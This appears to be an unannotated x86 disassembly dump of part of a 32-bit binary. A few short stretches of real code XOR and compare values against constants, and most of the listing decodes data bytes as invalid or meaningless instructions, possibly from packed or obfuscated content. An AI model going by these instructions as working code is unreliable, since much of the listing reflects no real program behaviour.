  4119c7:	mov    eax,DWORD PTR [eax+0x1d8]
  4119cd:	mov    eax,DWORD PTR [eax]
  4119cf:	xor    esi,0x6665
  4119d5:	or     esi,edx
  4119d7:	add    ecx,0xef6a96a5
  4119dd:	cdq    
  4119de:	adc    esi,0xc8b6a000
  4119e4:	cmp    eax,ecx
  4119e6:	jne    0x4119f4
  4119ec:	cmp    edx,esi
  4119ee:	je     0x411f3d
  4119f4:	mov    eax,DWORD PTR [ebp-0x50]
  4119f7:	jmp    0x411c6c
  4119fc:	loope  0x4119a1
  4119fe:	lods   eax,DWORD PTR ds:[esi]
  4119ff:	aam    0xab
  411a01:	mov    edx,0xd9d49ae0
  411a06:	gs mov esp,0xbeee06ab
  411a0c:	imul   BYTE PTR [esi+0x18]
  411a0f:	sbb    BYTE PTR [ecx+0x14],dh
  411a12:	sbb    BYTE PTR [eax],bl
  411a14:	cmp    DWORD PTR [ebp+esi*2+0x66e4d4f8],esp
  411a1b:	jb     0x411a72
  411a1d:	(bad)  
  411a1e:	iret   
  411a1f:	fldl2e 
  411a21:	jb     0x411a88
  411a23:	sahf   
  411a24:	lock ds aad 0xca
  411a28:	neg    DWORD PTR [esi-0x19]
  411a2b:	mov    al,ds:0x133bd4dc
  411a30:	mov    dl,0x77
  411a32:	(bad)  
  411a33:	sub    al,0xf2
  411a35:	popa   
  411a36:	ja     0x411a48
  411a38:	or     bh,al
  411a3a:	es and al,0xae
  411a3d:	pop    esp
  411a3e:	mov    ebx,0x1e9360b9
  411a43:	ret    
  411a44:	mov    WORD PTR [esi],gs
  411a46:	mov    ds:0x274fddc,eax
  411a4b:	xchg   BYTE PTR [edi],dh
  411a4d:	xor    edx,DWORD PTR [esi-0x49]
  411a50:	mov    dh,dh
  411a52:	cmp    eax,0xf8bab2b2
  411a57:	adc    eax,0x6c6ec5cd
  411a5c:	mov    cl,0x6a
  411a5e:	test   dh,bh
  411a60:	sub    al,0xb9
  411a62:	mov    ds,WORD PTR [eax+0x7f51fdce]
  411a68:	mov    edx,0xb59f8795
  411a6d:	mov    edx,0xf38f82e6
  411a72:	mov    BYTE PTR [eax+0x11affe87],bh
  411a78:	xchg   edi,eax
  411a79:	ins    BYTE PTR es:[edi],dx
  411a7a:	ret    0x89b3
  411a7d:	int    0x7e
  411a7f:	sub    eax,0xb9bdfd
  411a84:	lds    esi,FWORD PTR [ebp+0x2d3fa7dc]
  411a8a:	loope  0x411aa1
  411a8c:	dec    ebx
  411a8e:	push   eax
  411a8f:	or     DWORD PTR [ecx+0x3f285a07],0xffffffed
  411a96:	push   ds
  411a97:	scas   eax,DWORD PTR es:[edi]
  411a98:	dec    esi
  411a99:	cmp    eax,0xf9380c19
  411a9e:	ret    0x26fa
  411aa1:	fwait
  411aa2:	les    edx,FWORD PTR [ebp+0x10]
  411aa5:	into   
  411aa6:	cwde   
  411aa7:	or     DWORD PTR ss:[edi],esi
  411aaa:	xchg   ecx,eax
  411aab:	outs   dx,BYTE PTR ds:[esi]
  411aac:	jl     0x411a8e
  411aae:	int3   
  411aaf:	dec    esi
  411ab0:	xchg   ebx,eax
  411ab1:	ficomp WORD PTR [ebx+edx*4+0xd584624]
  411ab8:	push   ss
  411ab9:	retf   0xd2fa
  411abc:	and    al,0xb1
  411abe:	sbb    ch,bh
  411ac0:	fidiv  WORD PTR [ecx]
  411ac2:	out    0xa4,eax
  411ac4:	adc    al,ah
  411ac6:	pop    edi
  411ac7:	clc    
  411ac8:	fldcw  WORD PTR [edx-0x6370c982]
  411ace:	mov    dl,0x12
  411ad0:	jnp    0x411aa3
  411ad2:	rcl    DWORD PTR [ecx],cl
  411ad4:	xchg   edi,eax
  411ad5:	das    
  411ad6:	pop    esi
  411ad7:	sbb    bl,dh
  411ad9:	sahf   
  411ada:	sar    ebx,1
  411adc:	popa   
  411add:	mov    dl,0x51
  411adf:	lods   eax,DWORD PTR ds:[esi]
  411ae0:	popa   
  411ae1:	retf   
  411ae2:	(bad)  
  411ae3:	jmp    0x411ad1
  411ae5:	and    BYTE PTR [ecx+0x61999a4d],al
  411aeb:	outs   dx,DWORD PTR ds:[esi]
  411aec:	pop    esp
  411aed:	ret    
  411aee:	xchg   ecx,eax
  411aef:	jmp    0x411b1b
  411af1:	in     eax,0xe8
  411af3:	call   0x6e66:0xc5b6a9df
  411afa:	scas   eax,DWORD PTR es:[edi]
  411afb:	add    edi,ebx
  411afd:	clc    
  411afe:	inc    eax
  411aff:	mov    WORD PTR [ecx+edx*4],gs
  411b02:	fcmovnbe st,st(3)
  411b04:	xor    eax,0x72f59648
  411b09:	push   eax
  411b0a:	pop    ebp
  411b0b:	jb     0x411b5b
  411b0d:	fdivr  QWORD PTR [ebx-0x27aa87a8]
  411b13:	nop
  411b14:	sub    eax,0x3efbff27
  411b19:	mov    al,0x23
  411b1b:	sti    
  411b1c:	std    
  411b1d:	mov    ch,0xad
  411b1f:	lea    edi,[eax-0x23a2d4ab]
  411b25:	iret   
  411b26:	push   ecx
  411b27:	sub    eax,0xe573388e
  411b2c:	popf   
  411b2d:	jo     0x411bae
  411b2f:	inc    ecx
  411b30:	ret    
  411b31:	jbe    0x411b5a
  411b33:	mov    ds:0x8478d302,eax
  411b38:	pop    eax
  411b39:	and    DWORD PTR [ebx-0x4f],0xfffffff8
  411b3d:	or     al,0x1a
  411b3f:	inc    esp
  411b40:	lahf   
  411b41:	mov    edi,0xbb945266
  411b46:	mov    cl,0xd5
  411b48:	dec    edx
  411b49:	mov    ecx,0xddb01ff6
  411b4e:	gs xchg esp,eax
  411b50:	in     eax,dx
  411b51:	dec    edx
  411b52:	jecxz  0x411bc0
  411b54:	pop    ds
  411b55:	scas   eax,DWORD PTR es:[edi]
  411b56:	dec    ecx
  411b57:	pop    ebp
  411b58:	adc    eax,0x921962d7
  411b5d:	ret    
  411b5e:	pop    ebp
  411b5f:	stos   BYTE PTR es:[edi],al
  411b60:	push   cs
  411b61:	les    ebp,FWORD PTR [esi-0x40]
  411b64:	sub    BYTE PTR [edi-0x42],ah
  411b67:	xor    al,0xce
  411b69:	cmp    ah,BYTE PTR [ebx]
  411b6b:	fmul   QWORD PTR [ebx]
  411b6d:	pop    ebx
  411b6e:	mov    edi,0xf4265c5a
  411b73:	push   ss
  411b74:	call   0xb838:0xfc0ed2a5
  411b7b:	lods   eax,DWORD PTR ds:[esi]
  411b7c:	in     al,0xd7
  411b7e:	sar    DWORD PTR [eax],0x59
  411b81:	mov    al,0xfa
  411b83:	dec    esp
  411b84:	lock jmp 0x239b:0xfe86ddff
  411b8c:	xchg   ebp,eax
  411b8d:	xor    BYTE PTR [ebp-0x6a],bl
  411b90:	sub    edx,edi
  411b92:	mov    ch,0xe1
  411b94:	xchg   edx,eax
  411b95:	add    al,0x78
  411b97:	pusha  
  411b98:	out    0x9b,al
  411b9a:	into   
  411b9b:	int    0x10
  411b9d:	pop    esp
  411b9e:	sub    ah,BYTE PTR [ecx]
  411ba0:	push   fs
  411ba2:	out    dx,al
  411ba3:	out    dx,al
  411ba4:	jns    0x411bd4
  411ba6:	bound  esp,QWORD PTR [esi]
  411ba8:	xor    ecx,DWORD PTR [ebp-0x20]
  411bab:	inc    ebx
  411bac:	add    BYTE PTR [esi+0x4f],bh
  411baf:	pop    eax
  411bb0:	xchg   edx,eax
  411bb1:	lea    eax,[eax+eax*8+0x495ea18f]
  411bb8:	inc    esi
  411bb9:	pop    esp
  411bba:	sub    bh,dh
  411bbc:	sub    al,0x62
  411bbe:	lods   eax,DWORD PTR ds:[esi]
  411bbf:	xor    BYTE PTR [esi],0x8c
  411bc2:	dec    ecx
  411bc3:	in     eax,0x47
  411bc5:	pop    ds
  411bc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bc7:	mov    ebp,0xb5811ca3
  411bcc:	mov    al,0x22
  411bce:	or     eax,0x5333dab3
  411bd3:	mov    ds:0x4df12da9,eax
  411bd8:	clc    
  411bd9:	push   ds
  411bda:	gs call 0xbcf168e1
  411be0:	jmp    0x411bd0
  411be2:	iret   
  411be3:	add    eax,0x26b86477
  411be8:	sti    
  411be9:	fstp   TBYTE PTR [eax+0x4]
  411bec:	mov    dl,0x3c
  411bee:	inc    esp
  411bef:	repz cmp DWORD PTR [ebx+0x1b],edx
  411bf3:	add    dl,BYTE PTR [ebp-0x1e642dc1]
  411bf9:	push   ebp
  411bfa:	hlt    
  411bfb:	int3   
  411bfc:	add    ebp,esp
  411bfe:	(bad)  
  411bff:	stc    
  411c00:	popa   
  411c01:	std    
  411c02:	lods   eax,DWORD PTR ds:[esi]
  411c03:	repnz xlat BYTE PTR ds:[ebx]
  411c05:	or     eax,0x417b916a
  411c0a:	es pop esp
  411c0c:	xchg   esp,eax
  411c0d:	pop    esp
  411c0e:	push   ebp
  411c0f:	jg     0x411c10
  411c11:	dec    DWORD PTR [ebx-0x568e83fb]
  411c17:	out    dx,al
  411c18:	inc    ebp
  411c19:	dec    edx
  411c1a:	jle    0x411bfc
  411c1c:	call   0xc6546ef5
  411c21:	pop    edi
  411c22:	push   edi
  411c23:	retf   0x3054
  411c26:	xchg   edi,eax
  411c27:	push   edx
  411c28:	bound  ebp,QWORD PTR [ebp-0x75ae01f7]
  411c2e:	mov    bl,BYTE PTR [ebp-0x3b]
  411c31:	cmp    eax,0x8f07fcc8
  411c36:	pop    ss
  411c37:	push   0x77d1ad7e
  411c3c:	cwde   
  411c3d:	jbe    0x411be5
  411c3f:	jne    0x411ca7
  411c41:	mov    dl,bh
  411c43:	fild   WORD PTR [edx-0x7713b63b]
  411c49:	les    ebx,FWORD PTR [edx]
  411c4b:	(bad)  
  411c4c:	gs int3 
  411c4e:	cwde   
  411c4f:	fdiv   DWORD PTR [edx]
  411c51:	dec    ebx
  411c52:	jmp    0x7b87b91a
  411c57:	lods   eax,DWORD PTR ds:[esi]
  411c58:	and    al,0x17
  411c5a:	push   ds
  411c5b:	push   edx
  411c5c:	dec    edi
  411c5d:	or     bh,BYTE PTR [edi]
  411c5f:	or     al,0xf0
  411c61:	dec    edi
  411c62:	jno    0x411c8f
  411c64:	cwde   
  411c65:	retf   0x9f37
  411c68:	fdivr  QWORD PTR [edx+0x4d8bc3d9]
  411c6e:	mov    ah,0x8b
  411c70:	push   ebp
  411c71:	mov    al,ds:0x5a4758b
  411c76:	sbb    BYTE PTR [eax+0x0],bh
  411c79:	add    BYTE PTR [ecx+0x87d1],al
  411c7f:	add    BYTE PTR [ebx],cl
  411c81:	ret    0x558b
  411c84:	nop
  411c85:	jmp    0x411efa
  411c8a:	pop    ebp
  411c8b:	and    DWORD PTR [esi],esi
  411c8d:	xor    bh,BYTE PTR ds:[esi]
  411c90:	pop    ebp
  411c91:	sbb    bh,BYTE PTR [edi+edi*8+0x56776a08]
  411c98:	dec    ebx
  411c99:	jle    0x411cea
  411c9b:	push   0x18
  411c9d:	sbb    BYTE PTR [ecx+0x14],dh
  411ca0:	sbb    BYTE PTR [eax],bl
  411ca2:	inc    esi
  411ca3:	jecxz  0x411c8b
  411ca5:	imul   DWORD PTR [esi+0x53]
  411ca8:	mov    edi,0xffde8ab0
  411cad:	scas   eax,DWORD PTR es:[edi]
  411cae:	push   esi
  411caf:	sbb    ch,BYTE PTR [edx]
  411cb1:	mov    ds:0x2c80f7b0,eax
  411cb6:	jecxz  0x411ca6
  411cb8:	lea    ebx,[ebx]
  411cba:	pop    ss
  411cbb:	xchg   ebp,eax
  411cbc:	ds out dx,al
  411cbe:	aad    0xf8
  411cc0:	jp     0x411d21
  411cc2:	mov    al,ds:0xc8e8d774
  411cc7:	pop    edi
  411cc8:	hlt    
  411cc9:	sbb    eax,0x8ee52aad
  411cce:	mov    bh,0xbc
  411cd0:	dec    DWORD PTR [ecx+0x45]
  411cd3:	nop
  411cd4:	and    DWORD PTR [ebx+0x19711cbe],edx
  411cda:	arpl   WORD PTR [edx+0x35818bcd],cx
  411ce0:	fdiv   QWORD PTR [esi+edi*2-0x60cc71b8]
  411ce7:	ret    
  411ce8:	fisttp QWORD PTR [edx+ebp*8+0x4e]
  411cec:	stc    
  411ced:	loope  0x411cc1
  411cef:	mov    ch,0x20
  411cf1:	mov    ecx,0x170ffaf8
  411cf6:	add    ecx,DWORD PTR [ecx+0x5e6cf41b]
  411cfc:	shl    DWORD PTR ss:[ebx+0xe811990],cl
  411d03:	leave  
  411d04:	or     eax,edi
  411d06:	pop    ebx
  411d07:	jne    0x411d57
  411d09:	addr16 mov al,ds:0xccb1
  411d0d:	cdq    
  411d0e:	sbb    eax,0x4a45bfc0
  411d13:	add    esi,0xffffffca
  411d16:	stos   BYTE PTR es:[edi],al
  411d17:	(bad)  
  411d18:	test   edx,0xb1ccad0d
  411d1e:	daa    
  411d1f:	jg     0x411d67
  411d21:	push   eax
  411d22:	inc    esp
  411d23:	sub    DWORD PTR [esi-0x7af4cfff],ebx
  411d29:	mov    ecx,0x8aabdfb1
  411d2e:	sahf   
  411d2f:	fistp  QWORD PTR [edx+0x26]
  411d32:	ret    0x5b84
  411d35:	fst    DWORD PTR [eax]
  411d37:	das    
  411d38:	adc    al,BYTE PTR [ebx]
  411d3a:	ss out 0xa7,al
  411d3d:	call   FWORD PTR [eax+0x3b41f013]
  411d43:	fwait
  411d44:	add    esi,eax
  411d46:	fwait
  411d47:	sub    al,BYTE PTR [edi+ebx*1]
  411d4a:	mov    dl,0xaf
  411d4c:	dec    edi
  411d4d:	(bad)
  411d51:	cdq    
  411d52:	jl     0x411cf2
  411d54:	aas    
  411d55:	out    dx,al
  411d56:	out    0x6b,al
  411d58:	sbb    DWORD PTR [ecx],esi
  411d5a:	sub    BYTE PTR [ebx-0x77],dh
  411d5d:	dec    esi
  411d5e:	push   ecx
  411d5f:	imul   edx,DWORD PTR [ecx+0x6b],0x231b16b8
  411d66:	mov    ebp,DWORD PTR [ebx]
  411d68:	mov    edi,0x67166db2
  411d6d:	sub    DWORD PTR [esi],ebp
  411d6f:	fidiv  WORD PTR ds:0xdab46e5f
  411d75:	pop    ecx
  411d76:	retf   
  411d77:	dec    esp
  411d78:	shl    DWORD PTR ds:0x3ea65602,cl
  411d7e:	jo     0x411d7f
  411d80:	ret    
  411d81:	mov    dh,0x41
  411d83:	pushf  
  411d84:	test   eax,0x2581f3b4
  411d89:	test   BYTE PTR [esi+0x41],0x3e
  411d8d:	cmp    BYTE PTR cs:[esi+0x1d53e84b],cl
  411d94:	mov    eax,ds:0x20166094
  411d99:	or     ah,BYTE PTR [ebx+0x6343d999]
  411d9f:	sub    al,0x28
  411da1:	ret    
  411da2:	fnstsw WORD PTR ds:0x767034e7
  411da8:	fucom  st(5)
  411daa:	mov    fs,edx
  411dac:	aam    0x44
  411dae:	jge    0x411d6c
  411db0:	test   al,0x1c
  411db2:	push   cs
  411db3:	pop    ebx
  411db4:	sub    eax,DWORD PTR [ebx+ecx*1-0x72]
  411db8:	jns    0x411d6e
  411dba:	xor    BYTE PTR [ecx-0x2f],al
  411dbd:	rcr    DWORD PTR [esi+0x6200ca7b],1
  411dc3:	mov    bl,cl
  411dc5:	bound  edi,QWORD PTR [ebx]
  411dc7:	js     0x411dc0
  411dc9:	mov    dl,0xee
  411dcb:	aaa    
  411dcc:	mov    cl,BYTE PTR [edx+0xde8ba31]
  411dd2:	mov    ebp,0xce6a56fb
  411dd7:	mov    dl,0xf3
  411dd9:	loope  0x411d84
  411ddb:	jb     0x411dde
  411ddd:	pop    ds
  411dde:	push   esi
  411ddf:	mov    WORD PTR [eax-0x15],fs
  411de2:	jp     0x411daf
  411de4:	(bad)  
  411de5:	cmp    ebx,DWORD PTR [ecx]
  411de7:	repnz (bad) 
  411de9:	sar    DWORD PTR [eax-0x38],cl
  411dec:	sbb    esi,DWORD PTR [ebx+ebp*2+0x14]
  411df0:	shl    BYTE PTR [edi],cl
  411df2:	xor    DWORD PTR [ebp-0x11],0x2
  411df6:	push   edi
  411df7:	in     eax,0x1a
  411df9:	mov    fs,ecx
  411dfb:	or     DWORD PTR [ebx+edi*8],esi
  411dfe:	les    ebx,FWORD PTR [esi+0x12]
  411e01:	ins    DWORD PTR es:[edi],dx
  411e02:	xchg   ebx,eax
  411e03:	push   ecx
  411e04:	imul   esi,DWORD PTR [ebp+esi*1-0x749d6898],0x6
  411e0c:	retf   0x7407
  411e0f:	sti    
  411e10:	in     eax,dx
  411e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e12:	jle    0x411e1c
  411e14:	inc    ebx
  411e15:	leave  
  411e16:	fld    TBYTE PTR [ecx-0x3a]
  411e19:	imul   edx,DWORD PTR [edi],0x98b37259
  411e1f:	add    dl,bl
  411e21:	lds    edx,FWORD PTR [ebx+edx*2]
  411e24:	mov    dl,0x73
  411e26:	xor    DWORD PTR [ecx+0x112171c6],0x4e
  411e2d:	or     eax,0xd3c193b7
  411e32:	or     DWORD PTR [ecx-0x2808699b],0xfffffffb
  411e39:	jecxz  0x411e52
  411e3b:	cs push ds
  411e3d:	mov    dh,0x4f
  411e3f:	outs   dx,DWORD PTR ds:[esi]
  411e40:	xchg   esp,eax
  411e41:	ficomp WORD PTR [esi+ecx*2+0x22516b78]
  411e48:	push   edi
  411e49:	cmp    al,0x7d
  411e4b:	fdivp  st(7),st
  411e4d:	aad    0x1d
  411e4f:	jo     0x411eab
  411e51:	pop    edx
  411e52:	stos   BYTE PTR es:[edi],al
  411e53:	sub    esi,DWORD PTR [edi+0xd]
  411e56:	rol    eax,0x3b
  411e59:	mov    al,ds:0x1fee8061
  411e5e:	dec    ebp
  411e5f:	inc    esp
  411e60:	and    bl,ah
  411e62:	xchg   edx,eax
  411e63:	inc    ebp
  411e64:	add    bl,BYTE PTR [esi+0x41]
  411e67:	jmp    0x1ef7:0x96305cc1
  411e6e:	inc    ebx
  411e6f:	xchg   ebx,eax
  411e70:	imul   ebx,DWORD PTR [esi+0x4f],0x41
  411e74:	inc    esi
  411e75:	and    BYTE PTR [eax+0x63d6bb59],0xaf
  411e7c:	xor    al,0x73
  411e7e:	aas    
  411e7f:	or     al,0x3f
  411e81:	imul   edi,DWORD PTR [edx+0x17],0x78
  411e85:	sub    eax,DWORD PTR ds:0x62591a5d
  411e8b:	cmc    
  411e8c:	fwait
  411e8d:	add    ch,dl
  411e8f:	or     al,0x35
  411e91:	int3   
  411e92:	jmp    0x411e21
  411e94:	ss xor al,0x82
  411e97:	inc    esp
  411e98:	sbb    ch,bl
  411e9a:	lds    edi,FWORD PTR [esi]
  411e9c:	sar    esi,cl
  411e9e:	je     0x411e7f
  411ea0:	sub    dl,BYTE PTR [ebp-0x6c]
  411ea3:	jbe    0x411f11
  411ea5:	(bad)  
  411ea6:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  411ea8:	mov    ebx,0xfbe2c757
  411ead:	test   BYTE PTR [ecx-0x41],bh
  411eb0:	iret   
  411eb1:	jo     0x411ebc
  411eb3:	pop    ds
  411eb4:	fmul   DWORD PTR [eax-0x6417a78a]
  411eba:	sbb    BYTE PTR [ecx],0xb3
  411ebd:	pop    ebx
  411ebe:	inc    ecx
  411ebf:	sbb    DWORD PTR [ebx],ebp
  411ec1:	(bad)  
  411ec2:	fld    DWORD PTR [ebx+0x2e81341b]
  411ec8:	mov    edi,0xc6a362ea
  411ecd:	push   edi
  411ece:	mov    edi,0x67a3840b
  411ed3:	push   0x34b8ebb9
  411ed8:	ja     0x411f02
  411eda:	shl    BYTE PTR [esi+ebp*4+0x6c1674d],1
  411ee1:	adc    ecx,DWORD PTR [edx-0x6eb8903a]
  411ee7:	frstor [esi-0x5]
  411eea:	or     dl,BYTE PTR [ebx+0x31]
  411eed:	inc    edi
  411eee:	mov    ds:0xb2581db2,eax
  411ef3:	out    dx,eax
  411ef4:	jp     0x411e7b
  411ef6:	inc    ebp
  411ef7:	or     dh,cl
  411ef9:	sub    eax,0x758bce0b
  411efe:	xchg   esp,eax
  411eff:	push   esi
  411f00:	push   edx
  411f01:	push   ecx
  411f02:	push   eax
  411f03:	call   0x416c20
  411f08:	mov    ecx,DWORD PTR [ebp-0x80]
  411f0b:	mov    esi,DWORD PTR [ebp-0x7c]
  411f0e:	and    eax,ecx
  411f10:	mov    ecx,DWORD PTR ds:0x422558
  411f16:	mov    ecx,DWORD PTR [ecx+0x1d0]
  411f1c:	mov    ecx,DWORD PTR [ecx]
  411f1e:	and    edx,esi
  411f20:	xor    eax,0x2b01
  411f25:	xor    edx,0x2021
  411f2b:	xor    esi,esi
  411f2d:	cmp    ecx,eax
  411f2f:	jne    0x4127da
  411f35:	cmp    esi,edx
  411f37:	jne    0x4127da
  411f3d:	mov    eax,DWORD PTR [ebp-0xa4]
  411f43:	mov    ecx,DWORD PTR [ebp-0xc]
  411f46:	add    eax,0x80ca
  411f4b:	or     eax,ecx
  411f4d:	mov    ecx,DWORD PTR ds:0x4225f4
  411f53:	or     eax,0x686
  411f58:	xor    eax,0x3eec
  411f5d:	lea    eax,[eax+ecx*1-0xc11b]
  411f64:	xor    DWORD PTR ds:0x4225ec,eax
  411f6a:	mov    eax,DWORD PTR [ebp-0x64]
  411f6d:	and    eax,0x4dff
  411f72:	add    eax,DWORD PTR [ebp-0x14]
  411f75:	mov    ecx,DWORD PTR [ebp-0x94]
  411f7b:	xor    eax,0x676c
  411f80:	xor    edx,edx
  411f82:	div    ecx
  411f84:	mov    ecx,DWORD PTR [ebp-0x24]
  411f87:	mov    edx,DWORD PTR [ebp-0x74]
  411f8a:	xor    ecx,0x6e1e
  411f90:	imul   ecx,edx
  411f93:	mov    edx,DWORD PTR [ebp+0x8]
  411f96:	push   0x4
  411f98:	jmp    0x41220d
  411f9d:	mov    gs,WORD PTR [esp+ecx*4-0x7c]
  411fa1:	push   0x64
  411fa3:	jle    0x411fff
  411fa5:	inc    ebp
  411fa6:	inc    ecx
  411fa7:	jne    0x412025
  411fa9:	sbb    bl,dh
  411fab:	fnstsw WORD PTR [esi-0x5a]
  411fae:	data16 sbb BYTE PTR [eax],bl
  411fb1:	jno    0x411fc7
  411fb3:	sbb    BYTE PTR [eax],bl
  411fb5:	mov    esi,0x52f92174
  411fba:	or     ebp,DWORD PTR es:[eax]
  411fbd:	add    eax,0x58264235
  411fc2:	mov    eax,0xa5668cad
  411fc7:	pop    edi
  411fc8:	cmp    eax,0xaebd0d7
  411fcd:	sti    
  411fce:	adc    esp,esi
  411fd0:	iret   
  411fd1:	cli    
  411fd2:	inc    esi
  411fd3:	stos   BYTE PTR es:[edi],al
  411fd4:	pop    ecx
  411fd5:	outs   dx,DWORD PTR ds:[esi]
  411fd6:	xchg   ecx,eax
  411fd7:	fwait
  411fd8:	sub    eax,0x44f5bef0
  411fdd:	sbb    al,BYTE PTR [edx+0x14]
  411fe0:	aaa    
  411fe1:	retf   0x101f
  411fe4:	stos   BYTE PTR es:[edi],al
  411fe5:	push   es
  411fe6:	mov    dl,al
  411fe8:	fs inc ebp
  411fea:	sub    esi,esp
  411fec:	bound  ecx,QWORD PTR [ecx+0x1573fd7e]
  411ff2:	sub    eax,0x1f735046
  411ff7:	push   edi
  411ff8:	xor    DWORD PTR [edx],0xffffffd4
  411ffb:	sub    bh,bl
  411ffd:	jge    0x411fed
  411fff:	loope  0x411f8a
  412001:	xchg   esi,eax
  412002:	rcr    ah,1
  412004:	aaa    
  412005:	movzx  esp,WORD PTR [eax]
  412008:	arpl   dx,cx
  41200a:	dec    esi
  41200b:	dec    ebx
  41200c:	jecxz  0x412077
  41200e:	cwde   
  41200f:	icebp  
  412010:	test   DWORD PTR [eax+0x48652319],ebx
  412016:	jb     0x412054
  412018:	cmp    eax,DWORD PTR [esi]
  41201a:	mov    ds:0x5ac9ca24,eax
  41201f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412020:	ret    
  412021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412022:	test   eax,0x7abb0183
  412027:	push   edx
  412028:	sbb    eax,0x9c4b02a2
  41202d:	and    BYTE PTR [esi+0x4ba85ef7],0x95
  412034:	jo     0x412000
  412036:	cmp    edi,ebx
  412038:	fist   DWORD PTR [esi]
  41203a:	lock outs dx,DWORD PTR ds:[esi]
  41203c:	(bad)
  412040:	pop    edi
  412041:	in     al,dx
  412042:	cmp    al,0x99
  412044:	sub    ebx,DWORD PTR cs:[edx-0x11fa5dbc]
  41204b:	hlt    
  41204c:	jbe    0x412068
  41204e:	adc    BYTE PTR [ebx+0x63a2d1c5],dl
  412054:	dec    ecx
  412055:	xchg   ebx,eax
  412056:	mov    edi,0xf4e5dd18
  41205b:	jae    0x4120c9
  41205d:	inc    esi
  41205e:	push   DWORD PTR [esi+0x10066650]
  412064:	inc    edx
  412065:	pop    ds
  412066:	(bad)  
  412067:	sub    eax,DWORD PTR [eax]
  412069:	push   0xffffffd5
  41206b:	dec    edi
  41206c:	aas    
  41206d:	lock xchg edx,eax
  41206f:	push   esi
  412070:	mov    bl,0xcc
  412072:	nop
  412073:	cmp    al,0xe5
  412075:	retf   
  412076:	bound  esi,QWORD PTR [ecx+0x28]
  412079:	mov    al,0x64
  41207b:	aas    
  41207c:	jno    0x4120b0
  41207e:	push   eax
  41207f:	rcr    ah,0x3a
  412082:	and    DWORD PTR [edx],esi
  412084:	lods   al,BYTE PTR ds:[esi]
  412085:	push   esi
  412086:	sub    BYTE PTR [ebp+0x13d582df],cl
  41208c:	inc    esp
  41208d:	pop    edi
  41208e:	mov    esi,DWORD PTR [esi]
  412090:	jbe    0x41203a
  412092:	fwait
  412093:	xchg   esp,eax
  412094:	xor    BYTE PTR [esi],al
  412096:	std    
  412097:	iret   
  412098:	sbb    al,BYTE PTR [edi+0x64f65dc5]
  41209e:	neg    DWORD PTR [ebp-0x1f]
  4120a1:	adc    dh,BYTE PTR [eax-0x37629e25]
  4120a7:	fsubr  QWORD PTR [esi]
  4120a9:	mov    dh,0xb7
  4120ab:	and    DWORD PTR [esi],ebp
  4120ad:	inc    edx
  4120ae:	xchg   esp,eax
  4120af:	sbb    eax,0xe19b392
  4120b4:	retf   
  4120b5:	rol    DWORD PTR [ebp-0x4bea52d7],cl
  4120bb:	pop    ebx
  4120bc:	ret    
  4120bd:	sbb    DWORD PTR [ecx-0x3f0c9cc6],edx
  4120c3:	add    eax,0x2e1bb2c3
  4120c8:	cwde   
  4120c9:	scas   al,BYTE PTR es:[edi]
  4120ca:	lahf   
  4120cb:	test   BYTE PTR [edx-0x55],dh
  4120ce:	xchg   ecx,eax
  4120cf:	sub    BYTE PTR [esi-0x2b],bl
  4120d2:	mov    al,ds:0x23a856a3
  4120d7:	mov    ah,0x56
  4120d9:	jno    0x4120ea
  4120db:	dec    edi
  4120dc:	sub    BYTE PTR [ebp+ebp*2-0x17],dl
  4120e0:	and    ebp,0x73
  4120e3:	test   eax,0xebb5292e
  4120e8:	adc    BYTE PTR [ebp+0x405badd5],ch
  4120ee:	push   esi
  4120ef:	pushf  
  4120f0:	in     eax,dx
  4120f1:	push   edx
  4120f2:	outs   dx,DWORD PTR ds:[esi]
  4120f3:	nop
  4120f4:	shr    DWORD PTR [ebp-0x5d28c613],cl
  4120fa:	stos   BYTE PTR es:[edi],al
  4120fb:	sbb    DWORD PTR [eax],ebp
  4120fd:	les    esi,FWORD PTR [ecx]
  4120ff:	rcl    DWORD PTR [edi+0x5f],1
  412102:	scas   eax,DWORD PTR es:[edi]
  412103:	sbb    bl,BYTE PTR [esi+0x1cbbc6b9]
  412109:	xor    ecx,edx
  41210b:	or     al,0x51
  41210d:	xlat   BYTE PTR ds:[ebx]
  41210e:	mov    ch,0xf
  412110:	sub    al,0xd5
  412112:	xor    DWORD PTR [edi+0x53],0xffffffe0
  412116:	lea    ebx,[bx+0x52]
  41211a:	inc    eax
  41211b:	popa   
  41211c:	mov    ?,ebx
  41211e:	sub    DWORD PTR [ebx+0x5d],edi
  412121:	aas    
  412122:	lods   eax,DWORD PTR ds:[esi]
  412123:	dec    ebp
  412124:	inc    ecx
  412125:	(bad)
  41212a:	inc    ebp
  41212b:	pop    eax
  41212c:	inc    eax
  41212d:	test   BYTE PTR [ecx+0x0],cl
  412130:	repz rcl esi,0x95
  412134:	mov    ebx,0x5299f8ac
  412139:	sbb    al,0x43
  41213b:	fiadd  WORD PTR ds:0x3ac8e3bc
  412141:	loopne 0x41213e
  412143:	retf   0x70ce
  412146:	or     DWORD PTR [ebx-0x3f471d11],eax
  41214c:	repnz push ebp
  41214e:	das    
  41214f:	push   0xc30345cd
  412154:	push   edx
  412155:	ret    0x5520
  412158:	pop    ss
  412159:	pop    ecx
  41215a:	out    0xd,eax
  41215c:	out    0x79,al
  41215e:	ret    
  41215f:	push   ebp
  412160:	add    al,0xca
  412162:	arpl   WORD PTR [esi-0x36e8f3f4],bx
  412168:	cmp    eax,0x6342fc4e
  41216d:	push   esi
  41216e:	test   al,0xbb
  412170:	sub    ch,BYTE PTR [edi]
  412172:	jne    0x4121b2
  412174:	sub    bh,bh
  412176:	jg     0x412157
  412178:	ficom  WORD PTR gs:[edi+0x28077502]
  41217f:	push   0x98d68b3d
  412184:	cwde   
  412185:	xor    BYTE PTR [ecx+esi*1+0x35ded597],0x48
  41218d:	and    bl,BYTE PTR [ebx+0x2e]
  412190:	sbb    bh,BYTE PTR [ebp+eiz*8+0x5e2687c6]
  412197:	sub    al,ah
  412199:	test   eax,0x18ca5dd3
  41219e:	mov    edi,DWORD PTR [edi]
  4121a0:	jg     0x4121b7
  4121a2:	test   BYTE PTR [ebp-0x47],al
  4121a5:	xor    al,0xf3
  4121a7:	or     al,0x7d
  4121a9:	fild   DWORD PTR [ecx+0x29]
  4121ac:	jns    0x4121c2
  4121ae:	ret    
  4121af:	fsub   DWORD PTR [ebx]
  4121b1:	cmp    bl,dl
